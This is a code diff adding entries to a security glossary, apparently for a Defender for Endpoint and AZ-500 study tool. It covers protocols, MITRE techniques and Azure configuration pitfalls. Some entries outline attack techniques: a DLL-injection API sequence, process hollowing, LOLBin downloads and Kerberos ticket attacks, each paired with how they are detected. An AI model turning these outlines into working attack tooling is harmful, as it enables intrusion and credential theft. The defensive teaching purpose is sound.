+'port 443':{n:'Port 443 (HTTPS)',c:'Network Protocol',d:'HTTPS — encrypted web traffic. Used by legitimate apps AND by attackers for C2 (command-and-control) traffic that blends with normal web browsing. MDE\'s network protection evaluates the reputation of HTTPS destinations via SmartScreen.'},
+'port 80':{n:'Port 80 (HTTP)',c:'Network Protocol',d:'Unencrypted web traffic. Should not be used for any sensitive data. Attackers use it for C2, data exfiltration, and downloading payloads. All modern applications should use port 443 (HTTPS) instead.'},
+'port 5985':{n:'Port 5985/5986 (WinRM)',c:'Network Protocol',d:'Windows Remote Management — PowerShell remoting. Port 5985 (HTTP) and 5986 (HTTPS). Used for legitimate remote administration AND by attackers for lateral movement. MDE tracks remote PowerShell sessions.'},
+'port 22':{n:'Port 22 (SSH)',c:'Network Protocol',d:'Secure Shell — encrypted remote terminal access for Linux/Unix. Target for brute-force attacks. Azure Bastion or JIT access should be used instead of exposing SSH directly.'},
+'port 1433':{n:'Port 1433 (SQL Server)',c:'Network Protocol',d:'Microsoft SQL Server default port. Should never be publicly exposed. Use Private Endpoints in Azure. MDE detects anomalous SQL connections. Defender for SQL monitors for injection attacks.'},
+'dns':{n:'DNS (Domain Name System)',c:'Network Protocol',d:'Translates domain names to IP addresses. Attackers abuse DNS for: C2 communication (DNS tunneling), data exfiltration (encoding data in DNS queries), and reconnaissance. MDE captures DNS queries in DeviceNetworkEvents.'},
+'smb':{n:'SMB (Server Message Block)',c:'Network Protocol',d:'Windows file sharing protocol (port 445). Used for network shares, printer sharing. Critical for lateral movement — PsExec, WMI remote execution, and admin share (C$) access all use SMB. MDE\'s cross-device correlation detects SMB-based lateral movement.'},
+'rdp':{n:'RDP (Remote Desktop Protocol)',c:'Network Protocol',d:'Remote GUI access to Windows (port 3389). Brute force against RDP is the #1 initial access vector for ransomware. Never expose to internet. Use Azure Bastion, JIT access, or VPN. MDE detects RDP brute force via DeviceLogonEvents.'},
+'kerberos':{n:'Kerberos',c:'Authentication Protocol',d:'Windows/AD authentication protocol using tickets instead of passwords. Attackers target it via: Kerberoasting (extracting service tickets to crack offline), Golden Ticket (forging tickets with stolen krbtgt hash), Pass-the-Ticket. Defender for Identity monitors Kerberos attacks.'},
+'ntlm':{n:'NTLM',c:'Authentication Protocol',d:'Legacy Windows authentication protocol. Weaker than Kerberos. Vulnerable to: pass-the-hash, relay attacks, and credential theft. Should be disabled in favor of Kerberos where possible. MDE detects NTLM relay attempts.'},
+'tls':{n:'TLS (Transport Layer Security)',c:'Encryption Protocol',d:'Encrypts data in transit. TLS 1.2 is the minimum acceptable version (1.0/1.1 have vulnerabilities). TLS 1.3 is the latest. Azure services enforce minimum TLS version. Certificates managed via Key Vault.'},
+
+// SECURITY CONCEPTS
+'edr':{n:'EDR (Endpoint Detection & Response)',c:'Security Concept',d:'Technology that continuously monitors endpoints for threats. Collects behavioral telemetry (process, file, network, registry events), detects attack patterns, and provides response capabilities (isolate, quarantine, live response). MDE is Microsoft\'s EDR solution.'},
+'xdr':{n:'XDR (Extended Detection & Response)',c:'Security Concept',d:'Extends EDR across email, identity, cloud, and network — not just endpoints. Correlates alerts from multiple products into unified incidents. Microsoft Defender XDR correlates MDE + MDO + MDI + MCAS + MDC alerts. Key capability: Automatic Attack Disruption.'},
+'siem':{n:'SIEM (Security Information & Event Management)',c:'Security Concept',d:'Centralized log collection, correlation, and alerting. Ingests data from all security tools. Microsoft Sentinel is a cloud-native SIEM. Provides: analytics rules, threat hunting, SOAR automation, compliance reporting.'},
+'soar':{n:'SOAR (Security Orchestration, Automation & Response)',c:'Security Concept',d:'Automates security workflows — incident triage, enrichment, and response. In Sentinel: automation rules (lightweight if/then) + playbooks (Logic Apps for complex orchestration across 200+ service connectors).'},
+'c2':{n:'C2 (Command & Control)',c:'Attack Concept',d:'The communication channel between malware on a compromised system and the attacker\'s server. Common C2 channels: HTTPS (blends with normal traffic), DNS tunneling, social media APIs. MDE detects C2 via network protection (SmartScreen reputation) and behavioral patterns.'},
+'ioc':{n:'IOC (Indicator of Compromise)',c:'Security Concept',d:'Evidence that a system has been compromised. Types: file hashes (SHA256), IP addresses, domain names, URLs, registry keys, email addresses. In MDE, you can create custom indicators to block/alert on specific IOCs across all devices.'},
+'ttp':{n:'TTP (Tactics, Techniques, Procedures)',c:'Security Concept',d:'How attackers operate. Tactics = WHY (initial access, persistence). Techniques = HOW (phishing, scheduled task). Procedures = SPECIFIC implementation. Mapped to MITRE ATT&CK framework. More valuable than IOCs because TTPs change slowly.'},
+'apt':{n:'APT (Advanced Persistent Threat)',c:'Security Concept',d:'Sophisticated, well-funded threat actor (often nation-state) that maintains long-term presence in a target network. Examples: Midnight Blizzard (Russia), Volt Typhoon (China). Microsoft tracks APTs via MSTIC and names them after weather patterns.'},
+'zero day':{n:'Zero-Day',c:'Security Concept',d:'A vulnerability that has no patch available — the vendor has had "zero days" to fix it. Extremely valuable to attackers. MDE\'s behavioral detection and cloud ML can catch zero-day exploitation even without a signature, because they detect the BEHAVIOR, not the specific exploit.'},
+'lateral movement':{n:'Lateral Movement',c:'Attack Phase',d:'When an attacker moves from one compromised system to another within the network. Common techniques: PsExec, SMB admin shares, WMI remote execution, RDP, stolen credentials. MDE detects this via cross-device correlation — it sees the outbound connection on Device A AND the inbound logon on Device B.'},
+'persistence':{n:'Persistence',c:'Attack Phase',d:'Techniques attackers use to maintain access across reboots and logoffs. Common: scheduled tasks, registry Run keys, services, startup folder, WMI subscriptions, DLL hijacking. MDE monitors all persistence locations via DeviceRegistryEvents, DeviceProcessEvents, and DeviceEvents.'},
+'privilege escalation':{n:'Privilege Escalation',c:'Attack Phase',d:'Gaining higher-level permissions than initially obtained. Local: exploiting a kernel vulnerability to go from user to SYSTEM. Domain: compromising a domain admin account. MDE detects escalation via token manipulation, UAC bypass, and suspicious process elevation patterns.'},
+
+// MDE-SPECIFIC
+'amsi':{n:'AMSI (Antimalware Scan Interface)',c:'MDE Technology',d:'Windows API that allows antimalware products to inspect script content AFTER deobfuscation. When PowerShell decodes a Base64-encoded command, AMSI sees the decoded version. This defeats encoding/obfuscation. MDE has paired client+cloud ML models for each scripting engine (PowerShell, VBScript, JScript, VBA).'},
+'etw':{n:'ETW (Event Tracing for Windows)',c:'MDE Technology',d:'Windows kernel-level event tracing infrastructure. MDE\'s sensor hooks into ETW providers to capture process creation, file operations, registry changes, and network connections with minimal performance impact. It\'s the primary data collection mechanism on Windows.'},
+'ebpf':{n:'eBPF (Extended Berkeley Packet Filter)',c:'MDE Technology',d:'Linux kernel technology that MDE uses instead of kernel modules. Attaches programs to kernel tracepoints to capture syscalls (process, file, network) without custom kernel modules. More stable and compatible across Linux distributions than traditional approaches.'},
+'wfp':{n:'WFP (Windows Filtering Platform)',c:'MDE Technology',d:'Windows network filtering framework. MDE hooks into WFP callout drivers to capture all network connections (TCP/UDP) with the initiating process, destination IP/port, and URL. This is how Network Protection and web content filtering work — without packet capture overhead.'},
+'smartscreen':{n:'SmartScreen',c:'MDE Technology',d:'Microsoft\'s URL and file reputation service. Powered by signals from billions of Windows/Edge interactions worldwide. When a user visits a URL or downloads a file, SmartScreen checks its reputation against the Intelligent Security Graph. Blocks known malicious and warns on suspicious.'},
+'asr':{n:'ASR (Attack Surface Reduction)',c:'MDE Feature',d:'A set of rules that block specific attack techniques BEFORE they succeed. Examples: "Block Office from creating child processes" (prevents macro→PowerShell), "Block credential stealing from LSASS," "Block executable content from email." Modes: Audit (log only), Warn (user prompt), Block.'},
+'air':{n:'AIR (Automated Investigation & Remediation)',c:'MDE Feature',d:'When an alert fires, AIR automatically investigates: examines the entity, checks other devices for the same threat, generates verdicts (Malicious/Suspicious/Clean), and takes remediation actions (quarantine file, kill process, remove persistence). Configurable: Full auto, Semi (requires approval), or None.'},
+'live response':{n:'Live Response',c:'MDE Feature',d:'Remote interactive shell to any onboarded device through MDE\'s cloud channel. Run forensic commands (processes, connections, registry), upload/execute scripts, download files for analysis, and remediate threats. Works even on isolated devices. Supports Windows, macOS, and Linux.'},
+'kql':{n:'KQL (Kusto Query Language)',c:'Query Language',d:'The query language used in MDE Advanced Hunting, Sentinel, and Log Analytics. SQL-like syntax optimized for log data. Key operators: where (filter), project (select columns), summarize (aggregate), join (combine tables), ago() (time relative), has/contains (string matching).'},
+'tvm':{n:'TVM (Threat & Vulnerability Management)',c:'MDE Feature',d:'Continuously inventories all software on every device and cross-references against CVE databases. Prioritizes by REAL risk (exploit availability, breach likelihood, business context) not just CVSS score. Integrated with the same MDE sensor — no additional agents.'},
+
+// MITRE
+'mitre att&ck':{n:'MITRE ATT&CK',c:'Framework',d:'A knowledge base of adversary tactics and techniques based on real-world observations. Organized by: Tactics (the WHY — initial access, execution, persistence, etc.) and Techniques (the HOW — T1566 phishing, T1059 scripting, T1003 credential dumping). MDE maps every detection to ATT&CK techniques.'},
+'t1566':{n:'T1566 — Phishing',c:'MITRE Technique',d:'Initial access via fraudulent messages (email, social media). Sub-techniques: T1566.001 (Spearphishing Attachment — malicious file), T1566.002 (Spearphishing Link — malicious URL), T1566.003 (Spearphishing via Service — LinkedIn, Teams). MDE + MDO detect all sub-techniques.'},
+'t1059':{n:'T1059 — Command & Scripting Interpreter',c:'MITRE Technique',d:'Execution via scripting: T1059.001 (PowerShell), T1059.003 (Windows Command Shell), T1059.005 (Visual Basic), T1059.007 (JavaScript). MDE\'s AMSI integration captures deobfuscated script content for all of these.'},
+'t1003':{n:'T1003 — OS Credential Dumping',c:'MITRE Technique',d:'Extracting credentials from the OS. T1003.001 (LSASS Memory — dumping password hashes), T1003.002 (SAM — local account hashes), T1003.003 (NTDS.dit — domain controller database), T1003.006 (DCSync — replicating AD credentials). ASR rules + Credential Guard defend against T1003.001.'},
+'t1053':{n:'T1053 — Scheduled Task/Job',c:'MITRE Technique',d:'Persistence and execution via scheduled tasks. T1053.005 (Scheduled Task on Windows) is the most common. MDE detects via DeviceProcessEvents (schtasks.exe) and DeviceRegistryEvents (task registration). Also detects tasks created via COM objects or direct registry manipulation.'},
+'t1021':{n:'T1021 — Remote Services',c:'MITRE Technique',d:'Lateral movement via remote services. T1021.001 (RDP), T1021.002 (SMB/Windows Admin Shares), T1021.003 (DCOM), T1021.006 (Windows Remote Management/WinRM). MDE\'s cross-device correlation detects movement between devices regardless of which remote service is used.'},
+'t1041':{n:'T1041 — Exfiltration Over C2 Channel',c:'MITRE Technique',d:'Data theft using the same C2 channel used for command & control. The attacker doesn\'t need a separate exfil method — they send stolen data back over the existing HTTPS/DNS C2 connection. MDE detects unusual outbound data volumes and connections to known-bad infrastructure.'},
+
+// GENERAL SECURITY
+'hash':{n:'Hash (SHA256, SHA1, MD5)',c:'Security Concept',d:'A one-way mathematical function that produces a fixed-length fingerprint of a file. SHA256 (64 chars) is the current standard. MDE hashes every file at creation. If the hash matches a known-malicious file, it\'s blocked instantly. Used for IOC matching and file reputation.'},
+'signature':{n:'Signature (AV Signature)',c:'Security Concept',d:'A pattern that identifies specific known malware. Traditional AV relies heavily on signatures. MDE uses signatures as ONE layer but also uses ML, behavioral analysis, heuristics, emulation, and cloud detonation. Signatures alone can\'t catch zero-day or polymorphic malware.'},
+'fileless':{n:'Fileless Malware',c:'Attack Concept',d:'Malware that operates entirely in memory — no malicious files on disk. Uses legitimate tools (PowerShell, WMI, .NET) to execute malicious code. Traditional AV misses it because there\'s no file to scan. MDE catches it via: AMSI (script content), memory scanning, behavioral ML, and ETW process monitoring.'},
+'lolbin':{n:'LOLBin (Living off the Land Binary)',c:'Attack Concept',d:'Legitimate Windows binaries abused for malicious purposes: certutil.exe (download files), mshta.exe (execute scripts), rundll32.exe (load DLLs), regsvr32.exe (execute COM scripts). Hard to block because they\'re legitimate tools. MDE detects suspicious LOLBin usage via command-line analysis and behavioral patterns.'},
+'ransomware':{n:'Ransomware',c:'Attack Type',d:'Malware that encrypts files and demands payment for the decryption key. Modern ransomware also exfiltrates data before encrypting (double extortion). Kill chain: initial access (RDP/phishing) → credential theft → lateral movement → data exfil → encryption. MDE detects at multiple stages.'},
+'phishing':{n:'Phishing',c:'Attack Type',d:'Social engineering attack using fraudulent messages to trick users into clicking malicious links, opening attachments, or providing credentials. #1 initial access vector. Defended by: Defender for Office 365 (email), MDE (endpoint execution), Entra ID (credential theft detection).'},
+'credential stuffing':{n:'Credential Stuffing',c:'Attack Type',d:'Using stolen username/password pairs from data breaches to try logging into other services. Works because people reuse passwords. Defended by: MFA, Entra ID Identity Protection (detects leaked credentials), Conditional Access (risk-based blocking).'},
+'brute force':{n:'Brute Force',c:'Attack Type',d:'Systematically trying every possible password until the correct one is found. Variants: password spraying (one password across many accounts), credential stuffing (leaked passwords). Defended by: account lockout, MFA, Entra ID smart lockout, Sentinel analytics rules.'},
+
+// ADDITIONAL TERMS — CONTAINERS, CLOUD, INFRASTRUCTURE
+'image':{n:'Image (Multiple Meanings in Security)',c:'Core Concept',d:'The word "image" means different things depending on context:<br><br>🧠 <strong>1. Process Image / Image Load (MDE context):</strong> When Windows loads a program (.exe or .dll) into memory, it creates an "image" of that file in the process\'s memory space. This is what <strong>DeviceImageLoadEvents</strong> tracks — every DLL/executable loaded into any process. "Image load" = a binary file was mapped into a process\'s virtual memory. Attackers abuse this via: DLL sideloading (loading a malicious DLL from a trusted app\'s directory), reflective DLL injection (loading a DLL directly into memory without touching disk), and DLL search order hijacking. MDE monitors all image loads and flags unsigned DLLs loaded into signed processes.<br><br>📦 <strong>2. Container Image:</strong> A read-only template defining what runs inside a container — code, runtime, libraries. Stored in registries (ACR, Docker Hub). Scanned by Defender for Containers for vulnerabilities.<br><br>💿 <strong>3. VM/Disk Image:</strong> A snapshot of a VM\'s OS disk used as a template. Azure Marketplace images, custom images, golden images. MDE agentless scanning takes disk snapshots (images) to scan without agents.<br><br>⚠️ <strong>AZ-500 / MDE Exam Context:</strong> When the exam or MDE portal says "image" in the context of processes and detection, it means definition #1 — a binary loaded into memory. DeviceImageLoadEvents is the table. When it says "image" in the context of containers or VMs, it means definitions #2 or #3.'},
+'images':{n:'Images (Multiple Meanings)',c:'Core Concept',d:'Context matters:<br><br>🧠 <strong>In MDE / process context:</strong> "Image" = a binary (.exe or .dll) loaded into a process\'s memory. <strong>DeviceImageLoadEvents</strong> logs every image load. "Image load" means Windows mapped a file into virtual memory so a process can execute its code. Attackers exploit this via DLL sideloading, reflective injection, and search order hijacking.<br><br>📦 <strong>In container context:</strong> Templates that define container contents. Stored in registries. Scanned for vulnerabilities.<br><br>💿 <strong>In VM context:</strong> OS disk templates for creating VMs. Golden images = hardened baselines.'},
+'container':{n:'Container',c:'Infrastructure Concept',d:'A lightweight, isolated environment that packages an application with its dependencies. Runs on a shared OS kernel (unlike VMs which have their own OS). Orchestrated by Kubernetes (AKS, EKS, GKE). Security concerns: image vulnerabilities, runtime threats, cluster misconfiguration, escape attacks. Defender for Containers provides image scanning, runtime protection, and cluster hardening.'},
+'kubernetes':{n:'Kubernetes (K8s)',c:'Infrastructure Concept',d:'Open-source container orchestration platform. Manages deployment, scaling, and networking of containers. Azure: AKS (Azure Kubernetes Service). AWS: EKS. GCP: GKE. Security: RBAC, network policies, pod security, secrets management, image scanning. Defender for Containers monitors Kubernetes clusters.'},
+'docker':{n:'Docker',c:'Infrastructure Concept',d:'Platform for building and running containers. A Dockerfile defines the container image. Docker Hub is the public registry. In Azure, use Azure Container Registry (ACR) instead of Docker Hub for private, scanned images. MDE can monitor Docker containers on Linux via eBPF.'},
+'acr':{n:'ACR (Azure Container Registry)',c:'Azure Service',d:'Private container image registry in Azure. Stores Docker images. Features: geo-replication, image signing (content trust), vulnerability scanning via Defender for Containers, RBAC access control, Private Endpoints for network isolation. Scans images on push and continuously for new CVEs.'},
+'registry':{n:'Registry (Container Registry)',c:'Infrastructure Concept',d:'A storage service for container images. Public: Docker Hub, GitHub Container Registry. Private: Azure Container Registry (ACR), AWS ECR, GCP Artifact Registry. Security best practice: always use a private registry with vulnerability scanning, RBAC, and network restrictions.'},
+'vm':{n:'VM (Virtual Machine)',c:'Infrastructure Concept',d:'A software-based computer running on a physical host. In Azure: compute instances running Windows or Linux. Protected by: Defender for Servers (MDE integration), NSGs (network), disk encryption (ADE), JIT access (just-in-time port opening), Azure Bastion (secure remote access).'},
+'aks':{n:'AKS (Azure Kubernetes Service)',c:'Azure Service',d:'Managed Kubernetes service in Azure. Azure manages the control plane, you manage the worker nodes. Security: Entra ID integration for RBAC, network policies (Calico/Azure), pod security standards, Defender for Containers for runtime protection, private clusters (no public API endpoint).'},
+'vnet':{n:'VNet (Virtual Network)',c:'Azure Networking',d:'An isolated network in Azure. Your VMs, containers, and PaaS services live inside VNets. Segmented by subnets. Protected by NSGs (per-subnet/NIC), Azure Firewall (centralized), and UDRs (route tables). VNet peering connects VNets. Private Endpoints bring PaaS services into VNets.'},
+'nsg':{n:'NSG (Network Security Group)',c:'Azure Networking',d:'A firewall-like filter for Azure network traffic with allow/deny rules.<br><br>⚙️ <strong>How to Configure:</strong> Create NSG → add inbound/outbound rules with: Priority (100-4096, lower=first), Source/Dest (IP, Service Tag, ASG), Port, Protocol, Action (Allow/Deny) → Associate to subnet or NIC.<br><br>⚠️ <strong>Common Blockers:</strong><br>• <strong>Priority ordering!</strong> Lower number = evaluated first. A Deny at 100 blocks traffic before an Allow at 200 can match<br>• NSG on BOTH subnet AND NIC? Both are evaluated — traffic must pass BOTH (most restrictive wins)<br>• Default rules (65000-65500) can\'t be deleted. Default: allow VNet-to-VNet, allow AzureLoadBalancer, deny all other inbound<br>• NSGs DON\'T see traffic inside the same subnet unless you have a UDR forcing it through a firewall<br>• UDRs override NSG! If a UDR routes traffic to Azure Firewall, the NSG allows it but the firewall blocks it<br>• Service Tags (AzureCloud, Internet, VirtualNetwork) simplify rules but "Internet" includes ALL public IPs including Azure<br>• NSG Flow Logs are essential for troubleshooting — enable them and send to Log Analytics<br><br>✅ <strong>Troubleshooting:</strong> Network Watcher → NSG Diagnostics → "Effective Security Rules" shows the final merged rules from all NSGs. Use this FIRST when troubleshooting connectivity.'},
+'subnet':{n:'Subnet',c:'Azure Networking',d:'A segment within a VNet with its own IP range. Used for network segmentation: web subnet, app subnet, data subnet. Each subnet can have its own NSG and route table. Special subnets: GatewaySubnet (VPN), AzureFirewallSubnet, AzureBastionSubnet — these have specific naming requirements.'},
+'bastion':{n:'Azure Bastion',c:'Azure Service',d:'Managed jump box service for secure RDP/SSH access to VMs without exposing them to the internet. Deployed in AzureBastionSubnet. Connects via the Azure portal over TLS — no public IP needed on VMs. Replaces traditional jump boxes and VPN-based remote access.'},
+'jit':{n:'JIT (Just-In-Time) VM Access',c:'MDE/MDC Feature',d:'Opens management ports (RDP/SSH) only when needed, for a specific user, from a specific IP, for a limited time. Part of Defender for Servers P2. Default: all management ports are closed. When you request access, JIT creates a temporary NSG rule. Prevents brute-force attacks against always-open ports.'},
+'firewall':{n:'Azure Firewall',c:'Azure Service',d:'Cloud-native managed firewall for centralized network security.<br><br>⚙️ <strong>How to Configure:</strong> Create Azure Firewall in AzureFirewallSubnet (must be /26 minimum) → Create Firewall Policy → Add rule collections: Network rules (IP/port), Application rules (FQDN/URL filtering), DNAT rules (inbound NAT) → Create UDRs on workload subnets pointing 0.0.0.0/0 to the Firewall private IP.<br><br>⚠️ <strong>Common Blockers:</strong><br>• <strong>Subnet naming:</strong> MUST be called "AzureFirewallSubnet" exactly — any other name fails<br>• <strong>Subnet size:</strong> Minimum /26 — smaller subnets fail deployment<br>• <strong>UDR required!</strong> Azure Firewall doesn\'t intercept traffic automatically — you must create route tables pointing traffic to it. Without UDRs, traffic bypasses the firewall<br>• Rule processing order: DNAT → Network → Application. A network rule allowing port 443 is evaluated BEFORE an application rule blocking a specific FQDN on 443<br>• <strong>Threat Intelligence:</strong> enable "Alert and deny" mode (not just "Alert") for active blocking<br>• IDPS: available in Premium SKU only — Standard SKU doesn\'t have intrusion detection<br>• <strong>Forced tunneling:</strong> requires a separate AzureFirewallManagementSubnet if you route management traffic differently<br><br>✅ <strong>Best Practice:</strong> Use Azure Firewall Manager for multi-firewall environments. Always send diagnostic logs to Log Analytics for Sentinel integration. Enable IDPS in Alert+Deny mode (Premium).'},
+'private endpoint':{n:'Private Endpoint',c:'Azure Networking',d:'A network interface with a private IP from your VNet assigned to an Azure PaaS service.<br><br>⚙️ <strong>How to Configure:</strong> Private Link Center → Create Private Endpoint → select resource type (Microsoft.Sql/servers, Microsoft.Storage/storageAccounts, etc.) → select sub-resource (sqlServer, blob, vault) → pick VNet/subnet → integrate with Private DNS Zone.<br><br>⚠️ <strong>Common Blockers:</strong><br>• <strong>#1 Issue: DNS!</strong> Without a Private DNS Zone, the FQDN still resolves to the public IP and traffic bypasses the PE. Run nslookup — it MUST return a 10.x.x.x private IP, not the public IP<br>• You must ALSO disable public network access on the resource — otherwise both public and private paths work<br>• Private DNS Zone must be linked to the VNet — creating the zone alone isn\'t enough<br>• Each service type needs its own DNS zone (privatelink.database.windows.net, privatelink.blob.core.windows.net, privatelink.vaultcore.azure.net)<br>• NSGs on the PE subnet are supported but have specific behavior — check documentation<br>• PE doesn\'t work with forced tunneling if the DNS resolution happens on-premises and returns the public IP<br><br>✅ <strong>Best Practice:</strong> Always use PE + Private DNS Zone + disable public access. Verify with nslookup that the FQDN resolves to a private IP.'},
+'service endpoint':{n:'Service Endpoint',c:'Azure Networking',d:'Extends VNet identity to Azure PaaS services over the Azure backbone.<br><br>⚙️ <strong>How to Configure:</strong> VNet → Subnets → select subnet → Service Endpoints → add Microsoft.Storage, Microsoft.Sql, etc. Then on the target resource (e.g., Storage Account) → Networking → add the VNet/subnet to allowed list.<br><br>⚠️ <strong>Common Blockers:</strong><br>• Traffic still goes to the PUBLIC IP (just over Microsoft backbone, not internet) — not as secure as Private Endpoints<br>• You must enable the endpoint on the subnet AND add the subnet to the resource firewall — both steps required or it fails<br>• Service Endpoints don\'t work across VNet peering by default — the peered VNet needs its own endpoint<br>• Not supported for all services — check the service documentation<br>• Can\'t restrict to a specific resource — it allows access to ALL resources of that type (e.g., ALL storage accounts, not just one)<br><br>✅ <strong>Best Practice:</strong> Use Private Endpoints instead when possible. Service Endpoints are simpler but less secure. Only use for scenarios where Private Endpoints aren\'t supported or cost is a concern.'},
+'encryption':{n:'Encryption',c:'Security Concept',d:'Converting data into unreadable format. At rest: Azure Storage encryption (AES-256), TDE for SQL, Azure Disk Encryption, Key Vault. In transit: TLS 1.2+. Types: Microsoft-managed keys (MMK), Customer-managed keys (CMK — you control the key in Key Vault), double encryption (infrastructure + service layer).'},
+'managed identity':{n:'Managed Identity',c:'Azure Feature',d:'Azure-managed credentials for service-to-service authentication — no passwords in code. System-assigned: created with the resource, unique, deleted when resource is deleted. User-assigned: standalone, can be shared (but increases blast radius). Used with Key Vault, Storage, SQL, and any Azure service supporting Entra auth.'},
+'rbac':{n:'RBAC (Role-Based Access Control)',c:'Security Concept',d:'Permissions model based on roles assigned to users/groups at a specific scope. Azure RBAC: Owner, Contributor, Reader + hundreds of built-in roles. Key principle: least privilege — assign the most restrictive role at the narrowest scope. Data-plane roles (Storage Blob Data Reader) vs management-plane roles (Contributor).'},
+'conditional access':{n:'Conditional Access',c:'Entra ID Feature',d:'Zero Trust policy engine — if/then rules for authentication decisions.<br><br>⚙️ <strong>How to Configure:</strong> Entra ID → Protect & Secure → Conditional Access → New Policy → Assignments: Users (include/exclude), Target resources (cloud apps), Conditions (locations, device platforms, risk level) → Grant controls (MFA, compliant device, block) → Session controls (sign-in frequency, persistent browser) → Enable: Report-only first!<br><br>⚠️ <strong>Common Blockers:</strong><br>• <strong>#1 Mistake: Locking yourself out!</strong> Always exclude break-glass accounts. Always start in Report-only mode<br>• <strong>Policy evaluation:</strong> ALL policies are evaluated — most restrictive wins. If Policy A grants with MFA and Policy B blocks, the user is BLOCKED<br>• <strong>"All cloud apps" trap:</strong> Targets the Entra portal too — if you require compliant device + MFA for all cloud apps and your only admin has a non-compliant device, you\'re locked out<br>• <strong>Named Locations:</strong> Must be created BEFORE referencing in policies. Define trusted IPs as Named Locations first<br>• <strong>Service principals:</strong> Conditional Access for workload identities requires a separate policy type (Workload Identities Premium license)<br>• <strong>Legacy auth:</strong> Protocols like IMAP/SMTP/POP don\'t support MFA. Create a separate policy to BLOCK legacy authentication entirely<br>• <strong>Report-only insights:</strong> Entra ID → Sign-in logs → "Report-only" tab shows what WOULD have happened<br><br>✅ <strong>AZ-500 Tip:</strong> The exam loves questions about policy conflicts, break-glass accounts, and the difference between "All cloud apps" vs specific app targeting.'},
+'pim':{n:'PIM (Privileged Identity Management)',c:'Entra ID Feature',d:'Just-in-time privileged access. Users are "eligible" for admin roles but must activate them when needed. Activation can require: MFA, justification, approval, and is time-limited (e.g., 4 hours). Prevents standing admin access. Essential for Global Admin, Key Vault Admin, and other high-privilege roles.'},
+'mfa':{n:'MFA (Multi-Factor Authentication)',c:'Security Concept',d:'Requiring two or more verification factors: something you know (password), something you have (phone/FIDO2 key), something you are (biometrics). Blocks 99.9% of account compromise attacks. In Azure: Entra ID MFA, enforced via Conditional Access policies. Strongest: FIDO2 keys or Windows Hello (phishing-resistant).'},
+'defender for cloud':{n:'Defender for Cloud (MDC)',c:'Azure Service',d:'Cloud Native Application Protection Platform (CNAPP). Three pillars: CSPM (posture management — find misconfigurations), DevSecOps (code security), CWPP (workload protection — runtime threat detection). Covers Azure, AWS, GCP, on-premises. Features: Secure Score, attack path analysis, regulatory compliance, workload-specific Defender plans.'},
+'sentinel':{n:'Microsoft Sentinel',c:'Azure Service',d:'Cloud-native SIEM + SOAR. Collects data from 300+ connectors, detects threats with analytics rules (scheduled, NRT, Fusion ML, anomaly), investigates with graph-based tools and hunting, responds with automation rules and playbooks. Built on Log Analytics workspace. Moving to the Defender portal by March 2027.'},
+'key vault':{n:'Azure Key Vault',c:'Azure Service',d:'Secure storage for secrets, keys, and certificates.<br><br>⚙️ <strong>How to Configure:</strong> Create Key Vault → Permission model: select Azure RBAC (recommended, not vault access policies) → Networking: Private Endpoint + disable public access + allow trusted MS services → Enable soft delete (default, can\'t disable) → Enable purge protection (can\'t be reversed) → Diagnostic settings → Log Analytics workspace → Add secrets/keys/certs.<br><br>⚠️ <strong>Common Blockers:</strong><br>• <strong>RBAC vs Vault Access Policies:</strong> can\'t use both simultaneously. RBAC is recommended — supports Conditional Access, PIM, and granular scoping<br>• <strong>Soft delete gotcha:</strong> If you delete a vault and try to recreate with the same name, it fails because the soft-deleted vault still exists. Must purge first (if purge protection allows it)<br>• <strong>Purge protection:</strong> Once enabled, CANNOT be disabled. Even you can\'t permanently delete secrets until the retention period expires. Required for CMK scenarios<br>• <strong>"Trusted services" bypass:</strong> Must be enabled or Defender for Cloud, Azure Backup, and other MS services can\'t access the vault even with the right permissions<br>• <strong>Key rotation:</strong> Configure auto-rotation policies — near-expiry notification + automatic rotation. Apps using Key Vault references pick up new versions automatically<br>• <strong>Access from App Service:</strong> Use managed identity + Key Vault references in App Settings (@Microsoft.KeyVault(SecretUri=...)) — don\'t copy secrets to app config<br><br>✅ <strong>AZ-500 Tip:</strong> For CMK (customer-managed keys) on Storage/SQL, the Key Vault MUST have soft delete + purge protection enabled — it\'s a prerequisite.'},
+'azure policy':{n:'Azure Policy',c:'Azure Governance',d:'Enforces organizational standards on Azure resources. Effects: Deny (prevent non-compliant resources), Audit (log non-compliance), DeployIfNotExists (auto-remediate), Modify (add tags/settings). Initiatives group multiple policies. Microsoft Cloud Security Benchmark (MCSB) is a built-in initiative. Feeds into Defender for Cloud recommendations.'},
+'log analytics':{n:'Log Analytics Workspace',c:'Azure Service',d:'The database behind Sentinel. Stores all security logs in queryable tables. Query with KQL. Table plans: Analytics (full query, standard cost), Basic (limited query, ~60% cheaper), Auxiliary (archive, ~85% cheaper). Retention: 90 days interactive (default), up to 12 years long-term. Pay based on data ingestion volume (GB/day).'},
+'image load':{n:'Image Load (Process Memory)',c:'MDE / OS Concept',d:'When Windows maps a binary file (.exe or .dll) into a process\'s virtual memory address space so it can execute the code. Every time a process starts, Windows "loads the image" of the .exe. Every DLL the process needs is an additional "image load."<br><br>📊 <strong>MDE Table:</strong> DeviceImageLoadEvents — logs every DLL loaded into every process with: file path, hash, signature status, signer name, and the process that loaded it.<br><br>⚠️ <strong>Why attackers target image loads:</strong><br>• <strong>DLL Sideloading:</strong> Place a malicious DLL in the same folder as a trusted app — the app loads the attacker\'s DLL instead of the legitimate one<br>• <strong>Reflective DLL Injection:</strong> Load a DLL directly into another process\'s memory without writing to disk — fileless attack<br>• <strong>DLL Search Order Hijacking:</strong> Exploit the order Windows searches for DLLs (current dir → system dir) to load malicious versions<br>• <strong>Unsigned DLL in signed process:</strong> MDE flags when an unsigned DLL loads into a Microsoft-signed process — strong indicator of compromise'},
+'dll injection':{n:'DLL Injection',c:'Attack Technique',d:'Loading malicious code into another process\'s memory space via DLL. The target process then executes the attacker\'s code with its permissions.<br><br>🔴 <strong>Common techniques:</strong><br>• <strong>Classic injection:</strong> VirtualAllocEx → WriteProcessMemory → CreateRemoteThread (allocate memory in target, write DLL, create thread to load it)<br>• <strong>Reflective injection:</strong> DLL loads itself into memory without Windows API — avoids DeviceImageLoadEvents<br>• <strong>Process hollowing:</strong> Create a suspended process, unmap its memory, replace with malicious code, resume<br>• <strong>APC injection:</strong> Queue an asynchronous procedure call to load the DLL<br><br>🛡️ <strong>How MDE detects it:</strong> Kernel memory manager optics detect VirtualAlloc + WriteProcessMemory + CreateRemoteThread chains. Memory scanning engine inspects process memory for injected code. DeviceEvents logs suspicious memory operations.'},
